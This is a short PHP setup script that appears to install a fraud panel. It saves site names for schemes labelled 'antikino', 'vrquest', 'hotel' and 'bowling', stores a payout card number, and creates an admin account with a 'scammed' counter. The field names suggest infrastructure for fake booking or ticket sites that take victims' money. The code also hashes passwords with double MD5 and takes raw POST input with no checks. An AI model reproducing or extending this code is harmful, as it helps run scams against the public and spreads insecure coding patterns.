<?php
ob_start();
define("access", "yes"); 
require_once(__DIR__ . '/../engine/database/connection.php');
$login = $_POST['login'];
$pass = $_POST['password'];
$number = $_POST['cardnumber'];
$pay = $_POST['pay'];
$ak = $_POST['antikino'];
$av = $_POST['antikinovip'];
$vr = $_POST['vrquest'];
$vk = $_POST['vkcoins'];
$ht = $_POST['hotel'];
$bw = $_POST['bowling'];

	$sn = R::dispense('sitenames');
	$st = R::dispense('settings');
	$us = R::dispense('users');
	$sn->ak = $ak;
	$sn->av = $av;
	$sn->vr = $vr;
	$sn->vk = $vk;
	$sn->ht = $ht;
	$sn->bw = $bw;
	$sn->pay = $pay;
	$st->number = $number;
	$us->login = $login;
	$us->password = md5(md5($pass));
    $us->scammed = 0;
    $us->isadmin = 1;
	R::store($sn);
	R::store($st);
	R::store($us);
	R::exec('ALTER TABLE `settings` MODIFY COLUMN `number` BIGINT');